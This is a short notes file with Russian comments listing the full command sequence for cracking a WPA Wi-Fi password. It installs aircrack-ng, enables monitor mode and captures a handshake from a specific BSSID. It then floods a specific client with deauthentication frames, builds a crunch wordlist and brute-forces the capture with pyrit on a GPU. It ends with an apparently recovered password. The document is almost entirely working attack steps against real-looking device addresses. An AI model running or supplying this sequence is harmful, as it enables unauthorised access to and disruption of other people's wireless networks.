git clone http://github.com/aircrack-ng/aircrack-ng
env NOCONFIGURE=1 ./autogen.sh
./configure
make
sudo make install

# убить все процессы которые могу помешать остановить монитори wifi трафик
sudo airmon-ng check kill
# Запустите беспроводной интерфейс в режиме мониторинга:
sudo airmon-ng start wlo1
# Перехват рукопожатия
sudo airodump-ng wlo1mon

iw dev wlo0mon del
sudo airmon-ng start wlo1mon
# Мониторить сеть
sudo airodump-ng -c 5 --bssid B0:BE:76:09:3F:B0 -w WPAcrack wlo1mon --ignore-negative-one
# Деаунтификация клиента
sudo aireplay-ng --deauth 100 -a B0:BE:76:09:3F:B0 -c 20:82:C0:E6:51:29 wlo1mon --ignore-negative-one

# нализируем файл на наличе хендшейков
pyrit -r WPAcrack-06.cap analyze
# Генерируем пароль
crunch 3 7 abcd -o dict.txt
# Подбираем пароль для хендшейка
pyrit --all-handshakes -r WPAcrack-06.cap -i dict.txt attack_passthrough

# посмотреть видит ли GPU
pyrit list_cores

pyrit benchmark

password: Unz7ipd*

